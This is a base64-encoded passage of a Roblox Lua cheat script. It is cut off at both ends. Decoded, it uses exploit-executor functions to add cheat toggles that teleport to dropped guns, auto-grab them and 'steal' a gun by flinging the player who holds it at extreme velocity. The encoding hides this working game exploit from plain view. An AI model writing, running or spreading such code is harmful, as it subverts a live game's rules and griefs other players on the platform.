CAgIGxvY2FsIHBsYXllciA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgIGlmIG5vdCBjaGFyYWN0ZXIgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgbG9jYWwgaHJwID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBpZiBub3QgaHJwIHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICBsb2NhbCBndW5Ecm9wID0gbmlsCiAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMod29ya3NwYWNlOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGxvY2FsIHRlbXAgPSB2OkZpbmRGaXJzdENoaWxkKCJHdW5Ecm9wIikKICAgICAgICAgICAgaWYgdGVtcCB0aGVuCiAgICAgICAgICAgICAgICBndW5Ecm9wID0gdGVtcAogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgaWYgbm90IGd1bkRyb3AgdGhlbiByZXR1cm4gZW5kCgogICAgICAgIGxvY2FsIG9yaWdpbmFsQ0ZyYW1lID0gaHJwLkNGcmFtZQogICAgICAgIGlmIHNlbGVjdGVkID09ICJUZWxlcG9ydCB0byBHdW5Ecm9wIiB0aGVuCiAgICAgICAgICAgIGhycC5DRnJhbWUgPSBndW5Ecm9wLkNGcmFtZQogICAgICAgICAgICB0YXNrLndhaXQoMC4wMDEpCiAgICAgICAgICAgIGhycC5DRnJhbWUgPSBvcmlnaW5hbENGcmFtZQogICAgICAgIGVsc2VpZiBzZWxlY3RlZCA9PSAiVHdlZW4gdG8gR3VuRHJvcCIgdGhlbgogICAgICAgICAgICBsb2NhbCBUd2VlblNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlR3ZWVuU2VydmljZSIpCiAgICAgICAgICAgIGxvY2FsIGRpc3RhbmNlID0gKGd1bkRyb3AuUG9zaXRpb24gLSBocnAuUG9zaXRpb24pLk1hZ25pdHVkZQogICAgICAgICAgICBpZiBkaXN0YW5jZSA8IDEwIHRoZW4KICAgICAgICAgICAgICAgIGhycC5DRnJhbWUgPSBndW5Ecm9wLkNGcmFtZQogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDAxKQogICAgICAgICAgICAgICAgaHJwLkNGcmFtZSA9IG9yaWdpbmFsQ0ZyYW1lCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIGxvY2FsIGRpcmVjdGlvbiA9IChndW5Ecm9wLlBvc2l0aW9uIC0gaHJwLlBvc2l0aW9uKS5Vbml0CiAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRQb3NpdGlvbiA9IGd1bkRyb3AuUG9zaXRpb24gLSBkaXJlY3Rpb24gKiAxMAogICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0Q0ZyYW1lID0gQ0ZyYW1lLm5ldyh0YXJnZXRQb3NpdGlvbiwgZ3VuRHJvcC5Qb3NpdGlvbikKICAgICAgICAgICAgICAgIGxvY2FsIHR3ZWVuSW5mbyA9IFR3ZWVuSW5mby5uZXcoKHRhcmdldFBvc2l0aW9uIC0gaHJwLlBvc2l0aW9uKS5NYWduaXR1ZGUgLyA1MCwgRW51bS5FYXNpbmdTdHlsZS5RdWFkLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpCiAgICAgICAgICAgICAgICBsb2NhbCB0d2VlbiA9IFR3ZWVuU2VydmljZTpDcmVhdGUoaHJwLCB0d2VlbkluZm8sIHtDRnJhbWUgPSB0YXJnZXRDRnJhbWV9KQogICAgICAgICAgICAgICAgdHdlZW46UGxheSgpCiAgICAgICAgICAgICAgICB0d2Vlbi5Db21wbGV0ZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgaHJwLkNGcmFtZSA9IGd1bkRyb3AuQ0ZyYW1lCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDAxKQogICAgICAgICAgICAgICAgICAgIGhycC5DRnJhbWUgPSBvcmlnaW5hbENGcmFtZQogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZCkKICAgIAogICAgaWYgbm90IHN1Y2Nlc3MgdGhlbgogICAgICAgIHdhcm4oIkVycm9yIGVuIGxhIGVqZWN1Y2nDs246ICIgLi4gdG9zdHJpbmcoZXJyKSkKICAgIGVuZAplbmQpCgpnZXRnZW52KCkuc3RlYWxCdG4sIGdldGdlbnYoKS5jMSwgZ2V0Z2VudigpLmMyLCBnZXRnZW52KCkuYzMgPSBuaWwsIG5pbCwgbmlsLCBuaWwKZ2V0Z2VudigpLmZsLCBnZXRnZW52KCkub3JpLCBnZXRnZW52KCkucmV0LCBnZXRnZW52KCkudG9nID0gZmFsc2UsIG5pbCwgZmFsc2UsIHRydWUKCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjQsICJTdGVhbCBndW4iLCAiIiwgZ2V0Z2VudigpLnNhdmVkQ29uZmlnLnN0ZWFsR3VuIG9yIGZhbHNlLCBmdW5jdGlvbihzdGF0ZSkKICAgIGxvY2FsIFBsciA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCiAgICBsb2NhbCBScyA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpCiAgICBsb2NhbCBXcyA9IGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIikKICAgIGxvY2FsIGxwID0gUGxyLkxvY2FsUGxheWVyCiAgICBsb2NhbCBjYW0gPSBXcy5DdXJyZW50Q2FtZXJhCgogICAgbG9jYWwgZnVuY3Rpb24gc3RvcCgpCiAgICAgICAgZ2V0Z2VudigpLmZsID0gZmFsc2UKICAgICAgICBpZiBnZXRnZW52KCkuYzEgdGhlbiBnZXRnZW52KCkuYzE6RGlzY29ubmVjdCgpIGdldGdlbnYoKS5jMSA9IG5pbCBlbmQKICAgICAgICBpZiBnZXRnZW52KCkuYzIgdGhlbiBnZXRnZW52KCkuYzI6RGlzY29ubmVjdCgpIGdldGdlbnYoKS5jMiA9IG5pbCBlbmQKICAgICAgICBpZiBnZXRnZW52KCkuYzMgdGhlbiBnZXRnZW52KCkuYzM6RGlzY29ubmVjdCgpIGdldGdlbnYoKS5jMyA9IG5pbCBlbmQKICAgICAgICBsb2NhbCBjaGFyID0gbHAuQ2hhcmFjdGVyCiAgICAgICAgaWYgY2hhciB0aGVuCiAgICAgICAgICAgIGNhbS5DYW1lcmFTdWJqZWN0ID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKQogICAgICAgIGVuZAogICAgZW5kCgogICAgbG9jYWwgZnVuY3Rpb24gYmFjaygpCiAgICAgICAgaWYgZ2V0Z2VudigpLnJldCB0aGVuIHJldHVybiBlbmQKICAgICAgICBnZXRnZW52KCkucmV0ID0gdHJ1ZQogICAgICAgIGxvY2FsIGhycCA9IGxwLkNoYXJhY3RlciBhbmQgbHAuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBpZiBocnAgYW5kIGdldGdlbnYoKS5vcmkgdGhlbgogICAgICAgICAgICBocnAuQXNzZW1ibHlMaW5lYXJWZWxvY2l0eSA9IFZlY3RvcjMuemVybwogICAgICAgICAgICBocnAuVmVsb2NpdHkgPSBWZWN0b3IzLnplcm8KICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgaHJwLkNGcmFtZSA9IENGcmFtZS5uZXcoZ2V0Z2VudigpLm9yaSkKICAgICAgICBlbmQKICAgICAgICBzdG9wKCkKICAgIGVuZAoKICAgIGxvY2FsIGZ1bmN0aW9uIGZsaW5nKHApCiAgICAgICAgbG9jYWwgY2hhciA9IHAuQ2hhcmFjdGVyCiAgICAgICAgaWYgbm90IGNoYXIgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgc3RvcCgpCiAgICAgICAgZ2V0Z2VudigpLmZsID0gdHJ1ZQogICAgICAgIGdldGdlbnYoKS5yZXQgPSBmYWxzZQoKICAgICAgICBsb2NhbCBteUNoYXIgPSBscC5DaGFyYWN0ZXIKICAgICAgICBsb2NhbCBtZSA9IG15Q2hhciBhbmQgbXlDaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBpZiBub3QgbWUgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgZ2V0Z2VudigpLm9yaSA9IG1lLlBvc2l0aW9uCgogICAgICAgIGxvY2FsIHRndCA9IGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGlmIHRndCB0aGVuCiAgICAgICAgICAgIGxvY2FsIGh1bSA9IGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikKICAgICAgICAgICAgaWYgaHVtIHRoZW4KICAgICAgICAgICAgICAgIGNhbS5DYW1lcmFTdWJqZWN0ID0gaHVtCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAoKICAgICAgICBnZXRnZW52KCkuYzEgPSBScy5IZWFydGJlYXQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIG5vdCBnZXRnZW52KCkuZmwgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgIGxvY2FsIGggPSBscC5DaGFyYWN0ZXIgYW5kIGxwLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgIGlmIGggdGhlbgogICAgICAgICAgICAgICAgaC5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsIC05ZTcsIDApCiAgICAgICAgICAgICAgICBScy5SZW5kZXJTdGVwcGVkOldhaXQoKQogICAgICAgICAgICAgICAgaC5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsIC05ZTcsIDApCiAgICAgICAgICAgICAgICBScy5TdGVwcGVkOldhaXQoKQogICAgICAgICAgICAgICAgaC5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsIC0yLCAwKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCgogICAgICAgIGdldGdlbnYoKS5jMiA9IFJzLlJlbmRlclN0ZXBwZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIG5vdCBnZXRnZW52KCkuZmwgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgIGxvY2FsIHRoID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgIGxvY2FsIG1lID0gbHAuQ2hhcmFjdGVyIGFuZCBscC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICBpZiB0aCBhbmQgbWUgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgb2ZmID0gZ2V0Z2VudigpLnRvZyBhbmQgMC4zIG9yIC0wLjMKICAgICAgICAgICAgICAgIGdldGdlbnYoKS50b2cgPSBub3QgZ2V0Z2VudigpLnRvZwogICAgICAgICAgICAgICAgbG9jYWwgcHJlZCA9IDAuNjMKICAgICAgICAgICAgICAgIGxvY2FsIGRpciA9IHRoLkNGcmFtZS5Mb29rVmVjdG9yICogb2ZmCiAgICAgICAgICAgICAgICBsb2NhbCBwb3MgPSBWZWN0b3IzLm5ldygKICAgICAgICAgICAgICAgICAgICB0aC5Qb3NpdGlvbi5YICsgdGguVmVsb2NpdHkuWCAqIHByZWQgKyBkaXIuWCwKICAgICAgICAgICAgICAgICAgICB0aC5Qb3NpdGlvbi5ZLAogICAgICAgICAgICAgICAgICAgIHRoLlBvc2l0aW9uLlogKyB0aC5WZWxvY2l0eS5aICogcHJlZCArIGRpci5aCiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICBtZS5DRnJhbWUgPSBDRnJhbWUubmV3KHBvcykgKiBDRnJhbWUuQW5nbGVzKDAsIG1hdGgucmFkKDkwKSwgMCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQoKICAgICAgICBnZXRnZW52KCkuYzMgPSBScy5IZWFydGJlYXQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIG5vdCBnZXRnZW52KCkuZmwgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgIGxvY2FsIGh1bSA9IGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikKICAgICAgICAgICAgbG9jYWwgaHJwID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgIGlmIChub3QgaHVtIG9yIGh1bS5IZWFsdGggPD0gMCkgb3IgKGhycCBhbmQgaHJwLlZlbG9jaXR5Lk1hZ25pdHVkZSA+IDUwMCkgdGhlbgogICAgICAgICAgICAgICAgYmFjaygpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKCiAgICAgICAgdGFzay5kZWxheSg1LCBmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIG5vdCBnZXRnZW52KCkucmV0IHRoZW4KICAgICAgICAgICAgICAgIGJhY2soKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKCiAgICBpZiBub3Qgc3RhdGUgdGhlbgogICAgICAgIGlmIGdldGdlbnYoKS5zdGVhbEJ0biB0aGVuCiAgICAgICAgICAgIGdldGdlbnYoKS5zdGVhbEJ0bi5WaXNpYmxlID0gZmFsc2UKICAgICAgICBlbmQKICAgICAgICBzdG9wKCkKICAgIGVsc2UKICAgICAgICBpZiBub3QgZ2V0Z2VudigpLnN0ZWFsQnRuIHRoZW4KICAgICAgICAgICAgbG9jYWwgZ3VpID0gbHA6RmluZEZpcnN0Q2hpbGQoIlBsYXllckd1aSIpOkZpbmRGaXJzdENoaWxkKCJIRkciKQogICAgICAgICAgICBpZiBndWkgdGhlbiBndWk6RGVzdHJveSgpIGVuZAogICAgICAgICAgICBndWkgPSBJbnN0YW5jZS5uZXcoIlNjcmVlbkd1aSIsIGxwOldhaXRGb3JDaGlsZCgiUGxheWVyR3VpIikpCiAgICAgICAgICAgIGd1aS5OYW1lID0gIkhGRyIKICAgICAgICAgICAgZ3VpLlJlc2V0T25TcGF3biA9IGZhbHNlCiAgICAgICAgICAgIGdldGdlbnYoKS5zdGVhbEJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIsIGd1aSkKZ2V0Z2VudigpLnN0ZWFsQnRuLlNpemUgPSBVRGltMi5uZXcoMCwgNTAsIDAsIDUwKQpnZXRnZW52KCkuc3RlYWxCdG4uUG9zaXRpb24gPSBVRGltMi5uZXcoMSwgLTI4NSwgMCwgMTApCiAgICAgICAgICAgIGdldGdlbnYoKS5zdGVhbEJ0bi5UZXh0ID0gIkd1biBTdGVhbCIKICAgICAgICAgICAgZ2V0Z2VudigpLnN0ZWFsQnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtCiAgICAgICAgICAgIGdldGdlbnYoKS5zdGVhbEJ0bi5UZXh0U2l6ZSA9IDEwCiAgICAgICAgICAgIGdldGdlbnYoKS5zdGVhbEJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLm5ldygxLCAxLCAxKQogICAgICAgICAgICBnZXRnZW52KCkuc3RlYWxCdG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjAwLCAyMDApCiAgICAgICAgICAgIGdldGdlbnYoKS5zdGVhbEJ0bi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC43CiAgICAgICAgICAgIGdldGdlbnYoKS5zdGVhbEJ0bi5EcmFnZ2FibGUgPSB0cnVlCiAgICAgICAgICAgIGdldGdlbnYoKS5zdGVhbEJ0bi5BdXRvQnV0dG9uQ29sb3IgPSB0cnVlCiAgICAgICAgICAgIGxvY2FsIGNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKQpjb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgOCkKY29ybmVyLlBhcmVudCA9IHN0ZWFsQnRuCgpsb2NhbCBib3JkZXJGcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQpib3JkZXJGcmFtZS5TaXplID0gVURpbTIubmV3KDEsIDAsIDEsIDApCmJvcmRlckZyYW1lLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDAsIDApCmJvcmRlckZyYW1lLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCmJvcmRlckZyYW1lLlpJbmRleCA9IHN0ZWFsQnRuLlpJbmRleCArIDEKYm9yZGVyRnJhbWUuUGFyZW50ID0gc3RlYWxCdG4KCmxvY2FsIGJvcmRlclN0cm9rZSA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiKQpib3JkZXJTdHJva2UuVGhpY2tuZXNzID0gMgpib3JkZXJTdHJva2UuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigxODAsIDE4MCwgMTgwKQpib3JkZXJTdHJva2UuUGFyZW50ID0gYm9yZGVyRnJhbWUKCmxvY2FsIGZyYW1lQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCmZyYW1lQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDEwKQpmcmFtZUNvcm5lci5QYXJlbnQgPSBib3JkZXJGcmFtZQoKICAgICAgICAgICAgZ2V0Z2VudigpLnN0ZWFsQnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgaWYgZ2V0Z2VudigpLmZsIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgZm9yIF8sIHAgaW4gaXBhaXJzKFBscjpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgcCB+PSBscCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGJwLCBjaCA9IHA6RmluZEZpcnN0Q2hpbGQoIkJhY2twYWNrIiksIHAuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGhhcyA9IChicCBhbmQgYnA6RmluZEZpcnN0Q2hpbGQoIkd1biIpKSBvciAoY2ggYW5kIGNoOkZpbmRGaXJzdENoaWxkKCJHdW4iKSkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgaGFzIGFuZCBjaCBhbmQgY2g6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmbGluZyhwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgICAgIGdldGdlbnYoKS5zdGVhbEJ0bi5WaXNpYmxlID0gdHJ1ZQogICAgZW5kCiAgICBnZXRnZW52KCkuc2F2ZWRDb25maWcuc3RlYWxHdW4gPSBzdGF0ZQogICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQplbmQpCgpsb2NhbCBwbGF5ZXIgICAgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgY29yZUd1aSAgID0gZ2FtZTpHZXRTZXJ2aWNlKCJDb3JlR3VpIikKbG9jYWwgd29ya3NwYWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKQoKbG9jYWwgZnVuY3Rpb24gdG91Y2goYSwgYikKICAgIGZpcmV0b3VjaGludGVyZXN0KGEsIGIsIDApCiAgICBmaXJldG91Y2hpbnRlcmVzdChhLCBiLCAxKQplbmQKCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjQsICJCcmluZyBHdW4vKGJ1dHRvbikiLCAiIiwgZ2V0Z2VudigpLnNhdmVkQ29uZmlnLmJyaW5nR3VuIG9yIGZhbHNlLCBmdW5jdGlvbihzKQogICAgZ2V0Z2VudigpLnNhdmVkQ29uZmlnLmJyaW5nR3VuID0gcwogICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQogICAgbG9jYWwgZyA9IGNvcmVHdWk6RmluZEZpcnN0Q2hpbGQoIlRQR1VOIikKICAgIGlmIGcgdGhlbiBnOkRlc3Ryb3koKSBlbmQKICAgIGlmIHMgdGhlbgogICAgICAgIGxvY2FsIHNnID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiLCBjb3JlR3VpKQogICAgICAgIHNnLk5hbWUgPSAiVFBHVU4iCiAgICAgICAgbG9jYWwgYnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgICAgICBidG4uTmFtZSA9ICJUUEdVTkJ1dHRvbiIKICAgICAgICBidG4uVGV4dCA9ICJCcmluZyBHdW4iCiAgICAgICAgYnRuLlBvc2l0aW9uID0gVURpbTIubmV3KDEsIC0yMzAsIDAsIDEwKQpidG4uU2l6ZSA9IFVEaW0yLm5ldygwLCA2MCwgMCwgNTApCiAgICAgICAgYnRuLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwLjUKICAgICAgICBidG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjAwLCAyMDApCiAgICAgICAgYnRuLlRleHRDb2xvcjMgPSBDb2xvcjMubmV3KDEsMSwxKQogICAgICAgIGJ0bi5EcmFnZ2FibGUgPSB0cnVlCiAgICAgICAgbG9jYWwgY29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCmNvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA4KQpjb3JuZXIuUGFyZW50ID0gYnRuCgpsb2NhbCBib3JkZXJGcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQpib3JkZXJGcmFtZS5TaXplID0gVURpbTIubmV3KDEsIDAsIDEsIDApCmJvcmRlckZyYW1lLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDAsIDApCmJvcmRlckZyYW1lLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCmJvcmRlckZyYW1lLlpJbmRleCA9IGJ0bi5aSW5kZXggKyAxCmJvcmRlckZyYW1lLlBhcmVudCA9IGJ0bgoKbG9jYWwgYm9yZGVyU3Ryb2tlID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIpCmJvcmRlclN0cm9rZS5UaGlja25lc3MgPSAyCmJvcmRlclN0cm9rZS5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDE4MCwgMTgwLCAxODApCmJvcmRlclN0cm9rZS5QYXJlbnQgPSBib3JkZXJGcmFtZQoKbG9jYWwgZnJhbWVDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKZnJhbWVDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMTApCmZyYW1lQ29ybmVyLlBhcmVudCA9IGJvcmRlckZyYW1lCiAgICAgICAgYnRuLlBhcmVudCA9IHNnCiAgICAgICAgYnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBsb2NhbCBjID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBsb2NhbCByID0gYyBhbmQgYzpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgIGxvY2FsIGQgPSB3b3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQoIkd1bkRyb3AiLCB0cnVlKQogICAgICAgICAgICBpZiByIGFuZCBkIHRoZW4gdG91Y2gociwgZCkgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCmVuZCkKCmRvCiAgICBsb2NhbCBjMSwgYzIKICAgIExpYnJhcnkuYWRkVG9nZ2xlKHRhYjQsICJBdXRvIGdyYWIgR3VuIiwgIiIsIGdldGdlbnYoKS5zYXZlZENvbmZpZy5hdXRvR3JhYkd1biBvciBmYWxzZSwgZnVuY3Rpb24ocykKICAgICAgICBnZXRnZW52KCkuc2F2ZWRDb25maWcuYXV0b0dyYWJHdW4gPSBzCiAgICAgICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQogICAgICAgIGlmIGMxIHRoZW4gYzE6RGlzY29ubmVjdCgpIGMxPW5pbCBlbmQKICAgICAgICBpZiBjMiB0aGVuIGMyOkRpc2Nvbm5lY3QoKSBjMj1uaWwgZW5kCiAgICAgICAgaWYgcyB0aGVuCiAgICAgICAgICAgIGxvY2FsIGZ1bmN0aW9uIHR0KGQpCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoLjEpCiAgICAgICAgICAgICAgICBsb2NhbCBjID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgbG9jYWwgciA9IGMgYW5kIGM6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICAgICAgaWYgciBhbmQgZDpJc0EoIkJhc2VQYXJ0IikgdGhlbiB0b3VjaChyLCBkKSBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGMxID0gd29ya3NwYWNlLkNoaWxkQWRkZWQ6Q29ubmVjdChmdW5jdGlvbih4KSBpZiB4Lk5hbWU9PSJHdW5Ecm9wIiB0aGVuIHR0KHgpIGVuZCBlbmQpCiAgICAgICAgICAgIGMyID0gd29ya3NwYWNlLkRlc2NlbmRhbnRBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHgpIGlmIHguTmFtZT09Ikd1bkRyb3AiIHRoZW4gdHQoeCkgZW5kIGVuZCkKICAgICAgICAgICAgZm9yIF8seCBpbiBpcGFpcnMod29ya3NwYWNlOkdldERlc2NlbmRhbnRzKCkpIGRvIGlmIHguTmFtZT09Ikd1bkRyb3AiIHRoZW4gdHQoeCkgZW5kIGVuZAogICAgICAgIGVuZAogICAgZW5kKQplbmQKCmRvCiAgICBsb2NhbCBjMSwgYzIKICAgIExpYnJhcnkuYWRkVG9nZ2xlKHRhYjQsICJHdW4gQXVyYSIsICIiLCBnZXRnZW52KCkuc2F2ZWRDb25maWcuZ3VuQXVyYSBvciBmYWxzZSwgZnVuY3Rpb24ocykKICAgICAgICBnZXRnZW52KCkuc2F2ZWRDb25maWcuZ3VuQXVyYSA9IHMKICAgICAgICBnZXRnZW52KCkuc2F2ZUNvbmZpZyhnZXRnZW52KCkuc2F2ZWRDb25maWcpCiAgICAgICAgaWYgYzEgdGhlbiBjMTpEaXNjb25uZWN0KCkgYzE9bmlsIGVuZAogICAgICAgIGlmIGMyIHRoZW4gYzI6RGlzY29ubmVjdCgpIGMyPW5pbCBlbmQKICAgICAgICBpZiBzIHRoZW4KICAgICAgICAgICAgbG9jYWwgZnVuY3Rpb24gYXVyYSgpCiAgICAgICAgICAgICAgICB3aGlsZSBzIGRvCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNykKICAgICAgICAgICAgICAgICAgICBsb2NhbCBjID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHIgPSBjIGFuZCBjOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgICAgICBsb2NhbCBkID0gd29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKCJHdW5Ecm9wIiwgdHJ1ZSkKICAgICAgICAgICAgICAgICAgICBpZiByIGFuZCBkIGFuZCBkOklzQSgiQmFzZVBhcnQiKSBhbmQgKHIuUG9zaXRpb24gLSBkLlBvc2l0aW9uKS5NYWduaXR1ZGUgPD0gMTAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICB0b3VjaChyLCBkKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBjMSA9IHRhc2suc3Bhd24oYXVyYSkKICAgICAgICBlbmQKICAgIGVuZCkKZW5kCgpkbwogICAgbG9jYWwgYwogICAgTGlicmFyeS5hZGRUb2dnbGUodGFiNCwgIlZpZXcgRHJvcCBHdW4iLCAiIiwgZ2V0Z2VudigpLnNhdmVkQ29uZmlnLnZpZXdEcm9wR3VuIG9yIGZhbHNlLCBmdW5jdGlvbihzKQogICAgICAgIGdldGdlbnYoKS5zYXZlZENvbmZpZy52aWV3RHJvcEd1biA9IHMKICAgICAgICBnZXRnZW52KCkuc2F2ZUNvbmZpZyhnZXRnZW52KCkuc2F2ZWRDb25maWcpCiAgICAgICAgaWYgYyB0aGVuIGM6RGlzY29ubmVjdCgpIGM9bmlsIGVuZAogICAgICAgIGlmIG5vdCBzIHRoZW4KICAgICAgICAgICAgd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ2FtZXJhU3ViamVjdCA9IHBsYXllci5DaGFyYWN0ZXIgYW5kIHBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgb3IgcGxheWVyCiAgICAgICAgZWxzZQogICAgICAgICAgICBjID0g